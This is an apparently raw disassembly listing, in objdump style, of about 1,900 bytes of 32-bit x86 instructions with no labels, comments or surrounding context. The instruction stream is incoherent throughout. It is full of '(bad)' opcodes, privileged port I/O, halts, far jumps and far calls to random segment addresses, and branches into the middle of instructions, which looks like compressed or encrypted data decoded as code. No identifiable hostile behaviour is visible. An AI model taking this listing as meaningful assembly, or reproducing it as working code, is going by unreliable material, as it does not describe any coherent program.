  411d9c:	push   edi
  411d9d:	xchg   BYTE PTR [ebp+0x7c],bh
  411da0:	mov    edi,DWORD PTR [ebx+eiz*1-0x7e]
  411da4:	push   ss
  411da5:	jo     0x411da2
  411da7:	inc    esi
  411da9:	pushf  
  411daa:	dec    edi
  411dab:	mov    al,ds:0x104cf1a1
  411db0:	jmp    0x411d9e
  411db2:	loope  0x411dc5
  411db4:	dec    eax
  411db5:	mov    ds:0xcf1a7a1,eax
  411dba:	nop
  411dbb:	div    DWORD PTR ds:0xeba596c7
  411dc1:	popa   
  411dc2:	jl     0x411df7
  411dc4:	dec    esp
  411dc5:	es jb  0x411e1e
  411dc8:	add    BYTE PTR [ecx-0x163fb4cf],dl
  411dce:	mov    DWORD PTR [eax],ebp
  411dd0:	dec    eax
  411dd1:	mov    dl,0x9b
  411dd3:	sub    DWORD PTR [edi-0x6b],edx
  411dd6:	outs   dx,DWORD PTR ds:[esi]
  411dd7:	xlat   BYTE PTR ds:[ebx]
  411dd8:	fst    DWORD PTR [ebx+0x5770aca5]
  411dde:	or     eax,0x9d6b956a
  411de3:	int3   
  411de4:	add    dh,BYTE PTR [ebp+0x72]
  411de7:	(bad)  
  411de8:	clc    
  411de9:	mov    ecx,0x98c9943f
  411dee:	(bad)  
  411def:	and    esi,DWORD PTR [edi+0x4c]
  411df2:	aad    0x17
  411df4:	mov    ebx,0x3fed8b63
  411df9:	(bad)  
  411dfa:	xchg   ecx,eax
  411dfb:	push   0xa1edc702
  411e00:	test   eax,0xf1895b4a
  411e05:	(bad)  
  411e06:	mov    ebx,?
  411e08:	push   es
  411e09:	add    dh,BYTE PTR [esi]
  411e0b:	inc    esi
  411e0c:	mov    ebp,edx
  411e0e:	adc    eax,0x99b54c2c
  411e13:	cwde   
  411e14:	mov    al,ds:0x3fbaeeef
  411e19:	enter  0x22b2,0xe5
  411e1d:	outs   dx,DWORD PTR ds:[esi]
  411e1e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411e1f:	lods   eax,DWORD PTR ds:[esi]
  411e20:	ds adc al,0x63
  411e23:	push   es
  411e24:	jmp    0x411def
  411e26:	dec    esp
  411e27:	pop    ecx
  411e28:	push   cs
  411e29:	dec    edi
  411e2a:	in     eax,0x1e
  411e2c:	repz jnp 0x411e9d
  411e2f:	mov    ah,0x66
  411e31:	loopne 0x411e29
  411e33:	popf   
  411e34:	imul   ebx,DWORD PTR [edi+0x5418de59],0xffffff95
  411e3b:	test   DWORD PTR [ecx+0x3a2000],ebx
  411e41:	mov    eax,0x7894be62
  411e46:	or     cl,dh
  411e48:	stos   BYTE PTR es:[edi],al
  411e49:	scas   al,BYTE PTR es:[edi]
  411e4a:	xor    al,0xdd
  411e4c:	int3   
  411e4d:	ins    DWORD PTR es:[edi],dx
  411e4e:	ror    BYTE PTR [edi+edx*4+0x41],cl
  411e52:	dec    eax
  411e53:	(bad)  
  411e54:	dec    ebx
  411e55:	jnp    0x411dfd
  411e57:	fnstsw WORD PTR [ecx-0x62]
  411e5a:	xchg   edx,eax
  411e5b:	xchg   edi,eax
  411e5c:	jnp    0x411dec
  411e5e:	ins    BYTE PTR es:[edi],dx
  411e5f:	call   0x34f7:0xe8fb223b
  411e66:	jmp    0x7930190f
  411e6b:	and    ebp,DWORD PTR [esp+esi*8-0x38]
  411e6f:	jp     0x411ee0
  411e71:	xor    BYTE PTR [esi],dl
  411e73:	mov    cl,0x33
  411e75:	fimul  DWORD PTR [edx+eiz*2+0x4cf5999a]
  411e7c:	push   ss
  411e7d:	or     dh,0xe0
  411e80:	cmp    esi,DWORD PTR [edi-0x72]
  411e83:	hlt    
  411e84:	mov    dh,BYTE PTR [ebp-0xf]
  411e87:	push   eax
  411e88:	jbe    0x411eeb
  411e8a:	xchg   edi,eax
  411e8b:	dec    esi
  411e8c:	sbb    edi,DWORD PTR ds:0xdb792afa
  411e92:	pop    ebx
  411e93:	outs   dx,DWORD PTR ds:[esi]
  411e94:	mov    bl,0x64
  411e96:	push   ebx
  411e97:	jno    0x411e53
  411e99:	pop    esi
  411e9a:	xor    DWORD PTR [ecx],edx
  411e9c:	sub    ebx,esp
  411e9e:	inc    esi
  411e9f:	mov    ebp,0xcf10a4d0
  411ea4:	in     eax,dx
  411ea5:	push   ebx
  411ea6:	test   eax,esi
  411ea8:	fs mov esi,0xa6c18e75
  411eae:	iret   
  411eaf:	imul   ebp,DWORD PTR [eax+0x68],0xffffffbc
  411eb3:	fst    DWORD PTR [eax-0x7d]
  411eb6:	jb     0x411e54
  411eb8:	mov    edi,0xe9ec5f71
  411ebd:	clc    
  411ebe:	outs   dx,BYTE PTR ds:[esi]
  411ebf:	xchg   BYTE PTR [ebp-0x6cb0e72c],bh
  411ec5:	jbe    0x411f1f
  411ec7:	xchg   esi,eax
  411ec8:	jb     0x411eb7
  411eca:	push   ds
  411ecb:	scas   al,BYTE PTR es:[edi]
  411ecc:	dec    esi
  411ecd:	jmp    0x411e8f
  411ecf:	xchg   edx,eax
  411ed0:	jmp    0x4ae0:0x916587bf
  411ed7:	fstp   TBYTE PTR [ebx-0x4b]
  411eda:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411edb:	push   ds
  411edc:	pop    ebx
  411edd:	(bad)  
  411ede:	jle    0x411f15
  411ee0:	mov    ebp,0xed2efee0
  411ee5:	cld    
  411ee6:	(bad)  
  411ee8:	pop    ecx
  411ee9:	das    
  411eea:	mov    bl,0xb
  411eec:	adc    bl,BYTE PTR [ebx]
  411eee:	pop    eax
  411eef:	jae    0x411f5f
  411ef1:	fdiv   DWORD PTR [ecx-0x6e]
  411ef4:	jge    0x411f4a
  411ef6:	nop
  411ef7:	lock idiv BYTE PTR [ecx]
  411efa:	push   0x7a434474
  411eff:	loopne 0x411f10
  411f01:	adc    BYTE PTR [eax-0x142d1f70],dh
  411f07:	mov    bl,0x7a
  411f09:	ret    
  411f0a:	shr    DWORD PTR [ebp+0x71449957],0xdd
  411f11:	cmp    eax,0xb4e45562
  411f16:	mov    ecx,0x320dcb40
  411f1b:	(bad)  
  411f1c:	out    0xb3,eax
  411f1e:	push   ebx
  411f1f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411f20:	jnp    0x411f6e
  411f22:	int3   
  411f23:	in     al,dx
  411f24:	in     eax,dx
  411f25:	pusha  
  411f26:	je     0x411f2d
  411f28:	jle    0x411f11
  411f2a:	mov    dh,BYTE PTR [esi+edx*1+0x65]
  411f2e:	xchg   ebp,eax
  411f2f:	in     eax,dx
  411f30:	scas   al,BYTE PTR es:[edi]
  411f31:	add    DWORD PTR [edi-0x75],esp
  411f34:	lods   eax,DWORD PTR ds:[esi]
  411f35:	jns    0x411f3c
  411f37:	adc    dh,BYTE PTR [esp+esi*2-0x618f977b]
  411f3e:	lahf   
  411f3f:	mov    esi,esp
  411f41:	adc    ebx,DWORD PTR [edi]
  411f43:	adc    BYTE PTR [ebx],cl
  411f45:	mov    edi,0xfc93d0f1
  411f4a:	imul   ecx,DWORD PTR [ebx+eax*1+0x6cc1d9f1],0x5c
  411f52:	(bad)  [ebx+eax*1]
  411f55:	int3   
  411f56:	ins    DWORD PTR es:[edi],dx
  411f57:	or     al,0x87
  411f59:	in     al,dx
  411f5a:	icebp  
  411f5b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411f5c:	mov    esp,DWORD PTR [eax]
  411f5e:	mov    BYTE PTR [ebx+0x7f],ah
  411f61:	icebp  
  411f62:	ins    BYTE PTR es:[edi],dx
  411f63:	aad    0x5
  411f65:	and    eax,0x107d25da
  411f6a:	and    BYTE PTR [esi],ch
  411f6c:	or     BYTE PTR [ebx+0x53d9d6d6],0x1
  411f73:	pop    ebx
  411f74:	xor    al,0x5e
  411f76:	ins    DWORD PTR es:[edi],dx
  411f77:	scas   al,BYTE PTR es:[edi]
  411f78:	sub    ebp,DWORD PTR [esi+0x283024da]
  411f7e:	dec    ebp
  411f7f:	sub    al,0x51
  411f81:	rcl    BYTE PTR [ebx+0x36],1
  411f84:	jb     0x411f47
  411f86:	icebp  
  411f87:	scas   al,BYTE PTR es:[edi]
  411f88:	imul   esp,DWORD PTR [eax+0x3d],0xffffff8b
  411f8c:	xchg   ebp,eax
  411f8d:	sbb    DWORD PTR [esi-0x2b],eax
  411f90:	lock mov bh,0xd4
  411f93:	cmp    al,0xe5
  411f95:	out    0x99,eax
  411f97:	fmul   QWORD PTR [ebp-0x2435811f]
  411f9d:	ss inc esi
  411f9f:	dec    ecx
  411fa0:	and    eax,0x37d58884
  411fa5:	scas   al,BYTE PTR es:[edi]
  411fa6:	fsubr  st(0),st
  411fa8:	jb     0x411f46
  411faa:	inc    edi
  411fab:	inc    edx
  411fac:	xor    BYTE PTR [esi+0x3425e3b9],al
  411fb2:	(bad)  
  411fb3:	fcmovnbe st,st(5)
  411fb5:	add    eax,0x47148efa
  411fba:	dec    ecx
  411fbb:	sub    DWORD PTR [ebp-0x5be8d8cc],esp
  411fc1:	sbb    bl,BYTE PTR [esi+0x34]
  411fc4:	add    esp,edx
  411fc6:	shr    BYTE PTR [esi],cl
  411fc8:	scas   al,BYTE PTR es:[edi]
  411fc9:	(bad)  
  411fca:	fdivr  QWORD PTR [edx+ebx*1-0x45]
  411fce:	cmp    eax,0x713eb461
  411fd3:	dec    ebx
  411fd4:	retf   
  411fd5:	cld    
  411fd6:	ins    BYTE PTR es:[edi],dx
  411fd7:	and    BYTE PTR [esi],ah
  411fd9:	enter  0x5b72,0xda
  411fdd:	aad    0x2c
  411fdf:	jne    0x411f6e
  411fe1:	and    ebp,DWORD PTR [edi]
  411fe3:	sbb    dl,BYTE PTR [ecx-0x1f]
  411fe6:	rcl    DWORD PTR [edx+eiz*4-0x1585855a],cl
  411fed:	ja     0x411f91
  411fef:	rcr    dl,0x69
  411ff2:	pop    esi
  411ff3:	xor    ch,ch
  411ff5:	pop    ds
  411ff6:	lock push ebx
  411ff8:	cs enter 0x8565,0x63
  411ffd:	push   esp
  411ffe:	and    al,0xf0
  412000:	sub    bl,bh
  412002:	xchg   esi,eax
  412003:	inc    eax
  412004:	clc    
  412005:	cli    
  412006:	and    eax,0xdea4a131
  41200b:	pop    edx
  41200c:	js     0x411f9b
  41200e:	dec    ebx
  41200f:	dec    eax
  412010:	inc    ecx
  412011:	iret   
  412012:	das    
  412013:	pop    esi
  412014:	lock cmp bl,BYTE PTR [edi-0x1e]
  412018:	fbld   TBYTE PTR [edi+edi*4+0x64f86a4]
  41201f:	xchg   ebp,eax
  412020:	std    
  412021:	loopne 0x411fec
  412023:	xor    DWORD PTR [ecx+0x65b8b71f],ebp
  412029:	xchg   BYTE PTR [ebx+0x23c601ab],ah
  41202f:	fldz   
  412031:	loopne 0x412007
  412033:	jo     0x41208e
  412035:	mov    eax,ds:0x90f8ec8c
  41203a:	mov    dl,0x5a
  41203c:	inc    esp
  41203d:	push   esi
  41203e:	aas    
  41203f:	push   0xfffffffd
  412041:	cs sub eax,0x2e85be17
  412047:	sti    
  412048:	popf   
  412049:	mov    ah,0xed
  41204b:	push   ebx
  41204c:	jne    0x412050
  41204e:	out    dx,al
  41204f:	adc    eax,0xb859e8c5
  412054:	je     0x41208c
  412056:	ja     0x41207e
  412058:	pop    edi
  412059:	inc    eax
  41205a:	add    eax,0x4f12a073
  41205f:	inc    esp
  412060:	inc    eax
  412061:	or     edx,0x5e
  412064:	mov    ebx,0x440eb43c
  412069:	xchg   esp,eax
  41206a:	adc    eax,0x95b3c410
  41206f:	push   ebx
  412070:	push   cs
  412071:	(bad)  
  412073:	push   ebx
  412074:	aam    0xda
  412076:	mov    dh,0x74
  412078:	addr16 fdivrp st(4),st
  41207b:	dec    eax
  41207c:	ficom  DWORD PTR [eax-0x489c073c]
  412082:	and    DWORD PTR [esi],eax
  412084:	fstp   TBYTE PTR [eax-0x60b9baa3]
  41208a:	adc    bl,bl
  41208c:	xor    dh,BYTE PTR [ebx+eiz*1-0x39]
  412090:	push   edi
  412091:	shl    BYTE PTR [ebp+edx*1+0x7a],cl
  412095:	int3   
  412096:	mov    edx,0x20c6dc45
  41209b:	add    edx,DWORD PTR ds:[esi+0x44]
  41209f:	xchg   BYTE PTR [edx-0x353b36d9],ah
  4120a5:	xor    dl,ah
  4120a7:	sub    al,ch
  4120a9:	jle    0x41203e
  4120ab:	mov    DWORD PTR [ecx],ebx
  4120ad:	pop    ebp
  4120ae:	xchg   ecx,eax
  4120af:	mov    ds:0x742a132c,al
  4120b4:	dec    ecx
  4120b5:	add    bh,BYTE PTR ss:[edi]
  4120b8:	xor    dh,cl
  4120ba:	dec    ebp
  4120bb:	adc    cl,dh
  4120bd:	mov    BYTE PTR [edx-0x7b],ah
  4120c0:	fstp   QWORD PTR [edi+0x2]
  4120c3:	in     eax,0x8
  4120c5:	cwde   
  4120c6:	fcomp  DWORD PTR [ebx+0x3a5b031f]
  4120cc:	add    ebx,DWORD PTR [edi]
  4120ce:	sbb    dh,BYTE PTR [edi+0x77]
  4120d1:	retf   0x309f
  4120d4:	pop    esi
  4120d5:	or     esi,DWORD PTR [ebp+0x3]
  4120d8:	js     0x41212a
  4120da:	fist   WORD PTR [ebx-0x3e42fa09]
  4120e0:	push   cx
  4120e2:	push   es
  4120e3:	stc    
  4120e4:	pop    ss
  4120e5:	aad    0xc0
  4120e7:	cmp    eax,0x47e040cc
  4120ec:	jno    0x41215e
  4120ee:	inc    eax
  4120ef:	popa   
  4120f0:	sbb    eax,0x23e4b1c6
  4120f5:	repz jae 0x412136
  4120f8:	push   eax
  4120f9:	xor    al,0x70
  4120fb:	jne    0x4120be
  4120fd:	shl    DWORD PTR [edx-0x48],0xbc
  412101:	mov    bl,al
  412103:	cmp    BYTE PTR cs:[esi+0x2b2329c7],0x36
  41210b:	sti    
  41210c:	mov    al,ds:0x2f1c7eee
  412111:	bnd jo 0x4120de
  412114:	push   0x8
  412116:	pop    esp
  412117:	mov    ah,0xad
  412119:	add    dh,BYTE PTR [ebx]
  41211b:	retf   0x88e3
  41211e:	lods   al,BYTE PTR ds:[esi]
  41211f:	cli    
  412120:	mov    dl,0xf
  412122:	rcr    DWORD PTR [esi+ebx*8],1
  412125:	shl    DWORD PTR [ebx],0xd7
  412128:	nop
  412129:	sub    edi,esp
  41212b:	repz rcl BYTE PTR [edx+edx*2],cl
  41212f:	dec    ebp
  412130:	dec    ecx
  412131:	xor    ecx,edi
  412133:	dec    dl
  412135:	cmp    eax,0x153096a5
  41213a:	leave  
  41213b:	outs   dx,BYTE PTR ds:[esi]
  41213c:	dec    esp
  41213d:	cmp    DWORD PTR [ebx],0x9056dcfd
  412143:	(bad)  
  412144:	cwde   
  412145:	ss out 0x78,eax
  412148:	xlat   BYTE PTR ds:[ebx]
  412149:	mov    WORD PTR [ebp+0x502dc003],fs
  41214f:	xor    edx,edi
  412151:	ror    edx,1
  412153:	stc    
  412154:	fucomp st(3)
  412156:	dec    ebp
  412157:	xor    eax,0x5b47b242
  41215c:	in     eax,0x89
  41215e:	push   ds
  41215f:	sbb    BYTE PTR [ebp-0x2e7e7f5b],dh
  412165:	test   eax,0x450a02f7
  41216a:	int    0x44
  41216c:	mov    bh,0xab
  41216e:	rcr    bl,0x3a
  412171:	popa   
  412172:	lods   al,BYTE PTR ds:[esi]
  412173:	add    al,dl
  412175:	jbe    0x412139
  412177:	nop
  412178:	inc    esi
  412179:	retf   
  41217a:	pusha  
  41217b:	addr16 adc al,0xe5
  41217e:	loop   0x4121fe
  412180:	inc    esi
  412181:	add    eax,0xbabf40fe
  412186:	loope  0x4121f2
  412188:	add    eax,0xa3c391cc
  41218d:	stc    
  41218e:	adc    al,0x2a
  412190:	outs   dx,BYTE PTR ds:[esi]
  412191:	je     0x4121d1
  412193:	aam    0xd1
  412195:	shr    BYTE PTR [edx-0x7b],0xcc
  412199:	and    ah,0xc
  41219c:	fwait
  41219d:	(bad)  
  41219e:	dec    esp
  41219f:	sub    dh,BYTE PTR [eax]
  4121a1:	xchg   ebx,eax
  4121a2:	dec    ebp
  4121a3:	(bad)  [ebx]
  4121a5:	mov    ebp,0xb4ee34f2
  4121aa:	dec    edi
  4121ab:	xlat   BYTE PTR ds:[ebx]
  4121ac:	call   esi
  4121ae:	push   edi
  4121af:	std    
  4121b0:	repnz (bad) 
  4121b3:	fst    DWORD PTR [ecx-0x6f]
  4121b6:	in     eax,dx
  4121b7:	bound  edi,QWORD PTR [ecx+0x17]
  4121ba:	outs   dx,DWORD PTR ds:[esi]
  4121bb:	push   0xfffffff5
  4121bd:	loopne 0x41218b
  4121bf:	mov    ds:0x231e0dbf,eax
  4121c4:	add    DWORD PTR [eax-0xc0483b3],eax
  4121ca:	push   ebx
  4121cb:	sub    al,0x10
  4121cd:	cmp    eax,0x39abbbf0
  4121d2:	and    al,0xc
  4121d4:	sbb    al,0xc1
  4121d6:	mov    dh,0xa0
  4121d8:	leave  
  4121d9:	xchg   esi,eax
  4121da:	or     DWORD PTR [ecx],0x67
  4121dd:	outs   dx,DWORD PTR ds:[esi]
  4121de:	in     al,0x9b
  4121e0:	add    al,0xd3
  4121e2:	push   ecx
  4121e3:	jmp    0x412203
  4121e5:	xor    eax,0x2a2e06ec
  4121ea:	or     DWORD PTR [ecx],esp
  4121ec:	add    ch,BYTE PTR [ebp-0x35c52a76]
  4121f2:	(bad)  
  4121f3:	xor    cl,BYTE PTR [esi+0x7d1b6fd7]
  4121f9:	or     DWORD PTR [ebp+0x5e],0x41a21a08
  412200:	aas    
  412201:	jb     0x4121a1
  412203:	retf   0xd41c
  412206:	imul   BYTE PTR [ebx+esi*1]
  412209:	mov    BYTE PTR [edi],ch
  41220b:	mov    edx,0x1438b0d5
  412210:	neg    BYTE PTR [ebx+0x32]
  412213:	mov    eax,ds:0xe0270279
  412218:	push   edi
  412219:	cmp    eax,0xf01a144e
  41221e:	jmp    0x986a:0x28db55c9
  412225:	retf   
  412226:	pop    edx
  412227:	call   0xf16c:0x73b98977
  41222e:	fstp   TBYTE PTR [edx+ebx*1+0x58]
  412232:	push   cs
  412233:	(bad)  
  412234:	in     eax,0x8b
  412236:	imul   edx,DWORD PTR [ecx+ebp*2+0x3870e963],0xc2430923
  412241:	imul   ecx,DWORD PTR [esi-0x2088ea2d],0xfba508cb
  41224b:	(bad)  
  41224c:	in     al,0xf6
  41224e:	push   cs
  41224f:	mov    dh,0x63
  412251:	inc    ecx
  412252:	and    DWORD PTR [eax],ecx
  412254:	iret   
  412255:	popa   
  412256:	cmc    
  412257:	add    cl,cl
  412259:	push   ecx
  41225a:	ficomp DWORD PTR [esi]
  41225c:	mov    DWORD PTR [ebx-0x40],ecx
  41225f:	mov    edi,es
  412261:	clc    
  412262:	sbb    al,0x90
  412264:	inc    edx
  412265:	pop    es
  412266:	xor    BYTE PTR [ecx],bl
  412268:	pop    esp
  412269:	and    eax,DWORD PTR [edi-0x390dc686]
  41226f:	xor    cl,BYTE PTR [edx]
  412271:	inc    esp
  412272:	cli    
  412273:	push   cs
  412274:	inc    edx
  412275:	add    DWORD PTR [ebp-0x39],edx
  412278:	dec    edx
  412279:	push   ebp
  41227a:	push   0xffffffa9
  41227c:	xor    BYTE PTR [esp+edx*8+0x77],al
  412280:	sub    DWORD PTR [ebp+0x3e8ad81e],edx
  412286:	mov    ecx,0x94c3e631
  41228b:	test   eax,0x966a9f
  412290:	cli    
  412291:	sub    eax,0x6ccc0b3
  412296:	mov    ds:0x74a9ba49,al
  41229b:	jmp    0xb0cf:0x190a52fd
  4122a2:	in     eax,0x92
  4122a4:	pusha  
  4122a5:	arpl   WORD PTR [esi+esi*8+0xa61982e],di
  4122ac:	sub    bl,BYTE PTR [edi-0x516cf8a7]
  4122b2:	and    ecx,eax
  4122b4:	cmp    eax,0xf03f0c46
  4122b9:	mov    DWORD PTR [edx+esi*1-0x21],ebp
  4122bd:	test   BYTE PTR [ebp+0x38ab77ac],dh
  4122c3:	(bad)  
  4122c4:	dec    eax
  4122c5:	div    BYTE PTR [ecx+edi*4+0x4d]
  4122c9:	add    eax,esi
  4122cb:	ins    BYTE PTR es:[edi],dx
  4122cc:	cmp    ecx,DWORD PTR [ebp-0x66]
  4122cf:	jmp    FWORD PTR [eax]
  4122d1:	out    0xa4,eax
  4122d3:	sahf   
  4122d4:	ret    0x20f9
  4122d7:	xchg   edx,eax
  4122d8:	adc    al,BYTE PTR [eax-0x4d]
  4122db:	or     al,BYTE PTR [esp+eiz*8-0x617ef522]
  4122e2:	ss pushf 
  4122e4:	(bad)  
  4122e5:	call   0xa312:0x9086d3
  4122ec:	mov    ebp,DWORD PTR [esi+0x6e]
  4122ef:	out    0xbe,al
  4122f1:	xor    ebp,DWORD PTR [ebp+0x55]
  4122f4:	loope  0x412299
  4122f6:	and    eax,0x93fa6558
  4122fb:	push   ebx
  4122fc:	(bad)  
  4122fe:	inc    esp
  4122ff:	dec    BYTE PTR [esi-0x4049450f]
  412305:	aam    0xa8
  412307:	test   BYTE PTR [eax],0x8e
  41230a:	sahf   
  41230b:	daa    
  41230c:	push   edx
  41230d:	pop    eax
  41230e:	push   0xffffff87
  412310:	scas   al,BYTE PTR es:[edi]
  412311:	stos   BYTE PTR es:[edi],al
  412312:	jnp    0x4122e6
  412314:	stos   BYTE PTR es:[edi],al
  412315:	adc    eax,0x31dad7a0
  41231a:	and    ah,dl
  41231c:	ja     0x412334
  41231e:	arpl   WORD PTR [esi],dx
  412320:	ret    0xbd00
  412323:	adc    BYTE PTR [edi],0x51
  412326:	icebp  
  412327:	xchg   ebp,eax
  412328:	mul    bh
  41232a:	fisttp QWORD PTR [eax+esi*8+0x4]
  41232e:	push   dx
  412330:	jecxz  0x412352
  412332:	sbb    DWORD PTR [ebx-0x1e1ade10],edx
  412338:	sbb    esp,DWORD PTR [esi]
  41233a:	push   0xffffffca
  41233c:	sub    dl,bl
  41233e:	scas   eax,DWORD PTR es:[edi]
  41233f:	jo     0x412369
  412341:	aas    
  412342:	add    esi,DWORD PTR [esi-0x7a]
  412345:	xchg   ecx,esp
  412347:	or     al,0xc6
  412349:	mov    DWORD PTR [edx-0x1c],edi
  41234c:	fucomp st(4)
  41234e:	in     eax,0xaf
  412350:	ins    BYTE PTR es:[edi],dx
  412351:	xchg   esp,eax
  412352:	pop    edi
  412353:	jne    0x412330
  412355:	(bad)  
  412356:	mov    cl,0x61
  412358:	leave  
  412359:	and    al,0xfa
  41235b:	pop    ecx
  41235c:	pushf  
  41235d:	ins    DWORD PTR es:[edi],dx
  41235e:	xchg   DWORD PTR [edi+0x26548b94],edi
  412364:	je     0x4122ff
  412366:	addr16 jmp 0x7b82d7bb
  41236c:	or     al,0xfb
  41236e:	outs   dx,BYTE PTR ds:[esi]
  41236f:	lea    ebp,[edx]
  412371:	ret    0x8c8b
  412374:	xor    edx,DWORD PTR [edi+0x7]
  412377:	rcr    DWORD PTR [edx+edi*1-0x28],cl
  41237b:	ins    BYTE PTR es:[edi],dx
  41237c:	push   ebp
  41237d:	loopne 0x4123c3
  41237f:	adc    BYTE PTR [eax],bh
  412381:	ss out dx,al
  412383:	add    eax,0x1f661213
  412388:	or     al,0x9a
  41238a:	imul   BYTE PTR [ebx+0x126321f8]
  412390:	nop
  412391:	xor    DWORD PTR [esi-0x679769fc],eax
  412397:	lea    edi,[edx-0x5197a693]
  41239d:	repz xchg edi,eax
  41239f:	mov    bh,0xf3
  4123a1:	mov    bh,BYTE PTR [edi]
  4123a3:	xor    DWORD PTR [edx-0x46],esp
  4123a6:	pop    esi
  4123a7:	xor    DWORD PTR [esi+0x4f],esi
  4123aa:	fistp  QWORD PTR [ebp+0x1423d80f]
  4123b0:	sbb    BYTE PTR [eax],ah
  4123b2:	or     DWORD PTR [esi],0x34cf424f
  4123b8:	mov    al,bh
  4123ba:	or     BYTE PTR [ebx],0xd4
  4123bd:	loopne 0x41237d
  4123bf:	sub    ecx,DWORD PTR [edi-0x2e]
  4123c2:	imul   ebp,DWORD PTR [edx-0x6039466f],0xffffffab
  4123c9:	xchg   dl,bl
  4123cb:	push   esp
  4123cc:	add    DWORD PTR [edi+0x4f5aa],0x33387705
  4123d6:	inc    ebx
  4123d7:	add    al,0x84
  4123d9:	push   esi
  4123da:	arpl   cx,sp
  4123dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4123dd:	ins    BYTE PTR es:[edi],dx
  4123de:	out    0xc8,eax
  4123e0:	jno    0x4123f7
  4123e2:	sar    BYTE PTR [esi+0x6e270120],cl
  4123e8:	jno    0x412433
  4123ea:	pop    ecx
  4123eb:	jmp    0x4123ee
  4123ed:	std    
  4123ee:	mov    ch,0x7f
  4123f0:	or     al,0x45
  4123f2:	cwde   
  4123f3:	les    eax,FWORD PTR [edi]
  4123f5:	inc    edi
  4123f6:	mov    dh,BYTE PTR [ebp-0x436d8b5e]
  4123fc:	dec    ebx
  4123fd:	pop    ss
  4123fe:	xchg   edi,eax
  4123ff:	jns    0x4123fd
  412401:	dec    eax
  412402:	sahf   
  412403:	pop    es
  412404:	stos   DWORD PTR es:[edi],eax
  412405:	mov    edi,DWORD PTR ds:0xb2c7b4b9
  41240b:	int3   
  41240c:	dec    esp
  41240d:	cmp    BYTE PTR [ebx-0x39],0xcd
  412411:	mov    al,bl
  412413:	push   ebp
  412414:	mov    ebx,0xe5563801
  412419:	(bad)  
  41241a:	loopne 0x41240b
  41241c:	clc    
  41241d:	cmp    al,0x69
  41241f:	xchg   esp,edx
  412421:	shr    DWORD PTR [edx+0x6e],0xfa
  412425:	js     0x41246f
  412427:	in     al,0x48
  412429:	aas    
  41242a:	js     0x4123d4
  41242c:	sbb    DWORD PTR [ebx+esi*2],edx
  41242f:	inc    esi
  412430:	mov    edx,0x14089d15
  412435:	adc    BYTE PTR [edi+0xd69d4e0],bl
  41243b:	sub    eax,0x2257a3e0
  412440:	sbb    al,0x84
  412442:	out    dx,al
  412443:	xor    eax,0x5edaad33
  412448:	fstp   TBYTE PTR [edx-0x5c]
  41244b:	sub    eax,0xd22c0705
  412450:	pop    ds
  412451:	pop    ds
  412452:	or     eax,0xa673622a
  412457:	test   BYTE PTR [ebx],dl
  412459:	clc    
  41245a:	mov    eax,DWORD PTR [esi+0x19763b6c]
  412460:	add    eax,0x705a8e68
  412465:	push   0xffffffd0
  412467:	pop    esp
  412468:	pusha  
  412469:	int3   
  41246a:	push   ebx
  41246b:	adc    edx,DWORD PTR [ebx+0x5314974c]
  412471:	nop
  412472:	dec    edx
  412473:	inc    edx
  412474:	(bad)  
  412475:	mov    esi,edi
  412477:	aam    0x69
  412479:	test   eax,0x1cd63af5
  41247e:	push   ss
  41247f:	mov    dl,0x4a
  412481:	inc    ebp
  412482:	in     eax,dx
  412483:	mov    ebp,0xdc778f5
  412488:	rol    BYTE PTR [eax+0x6e5733bd],0xb5
  41248f:	call   0x9832b357
  412494:	ret    0x95ac
  412497:	xor    dh,BYTE PTR [ebx+0x6d]
  41249a:	ds pop ds
  41249c:	cld    
  41249d:	shr    BYTE PTR [ecx+edi*1],0xc2
  4124a1:	cld    
  4124a2:	clc    
  4124a3:	js     0x412473
  4124a5:	pop    esp
  4124a6:	(bad)  
  4124a7:	ficom  DWORD PTR [esi+ebp*8]
  4124aa:	add    al,0x8b
  4124ac:	push   esp
  4124ad:	push   ebx
  4124ae:	push   0x4f
  4124b0:	cli    
  4124b1:	fisub  DWORD PTR [edi+0x7d]
  4124b4:	pushf  
  4124b5:	and    esi,eax
  4124b7:	mov    dl,0x17
  4124b9:	stc    
  4124ba:	popf   
  4124bb:	add    DWORD PTR [edi+esi*2+0x17a2df68],ecx
  4124c2:	inc    esp
  4124c3:	ins    DWORD PTR es:[edi],dx
  4124c4:	push   esp
  4124c5:	sub    ebx,ecx
  4124c7:	mov    ds,ebp
  4124c9:	icebp  
  4124ca:	push   cs
  4124cb:	add    ebp,DWORD PTR [edi+0x3804f429]
  4124d1:	mov    esp,0x64bb603
  4124d6:	fadd   QWORD PTR [ebp-0x9]
  4124d9:	push   edi
  4124da:	push   ecx
  4124db:	mov    dl,0x58
  4124dd:	(bad)  
  4124de:	cmc    
  4124df:	in     al,dx
  4124e0:	adc    ecx,DWORD PTR [ecx+ebp*1-0x4]
  4124e4:	outs   dx,DWORD PTR ds:[esi]
  4124e5:	aad    0xd5
  4124e7:	jmp    0x41249d
  4124e9:	rol    DWORD PTR [ebp+0x2469f586],0xd2
  4124f0:	les    eax,FWORD PTR [edx]
  4124f2:	jecxz  0x4124ba
  4124f4:	jno    0x41250f
  4124f6:	jp     0x41256f
  4124f8:	sub    bl,BYTE PTR [ecx]
  4124fa:	adc    ah,BYTE PTR [ecx+0x64]
  4124fd:	std    
  4124fe:	aas    
  4124ff:	and    al,0xaf
  412501:	or     eax,0xb8a83722
  412506:	sub    BYTE PTR [esp+eax*4-0x725c9c2d],0x4f
  41250e:	add    BYTE PTR [edi+0x3928ab96],0xad
  412515:	sub    al,0x59
  412517:	jecxz  0x412545
  412519:	iret   
  41251a:	pop    esi
  41251b:	cmc    
  41251c:	fxch   st(6)
  41251e:	xor    BYTE PTR [ebx+0x68],al
  412521:	mov    dh,0xde
  412523:	(bad)  
  412524:	lods   al,BYTE PTR ds:[esi]
  412525:	lock bswap edi
  412528:	jns    0x41259e
  41252a:	int3   
  41252b:	sbb    eax,0xed3b7ec2
  412530:	pop    ecx
  412531:	hlt    
  412532:	jnp    0x4124fc
  412534:	inc    ebx
  412535:	(bad)  
  412536:	(bad)  
  412537:	xor    BYTE PTR [eax-0x32],al
  41253a:	xchg   ecx,eax
  41253b:	call   0xf7e51ea7
  412540:	fs stc 
  412542:	push   cs
  412543:	adc    DWORD PTR [ebx],0x6f7e3188
  412549:	loope  0x4124d2
  41254b:	xchg   esi,eax
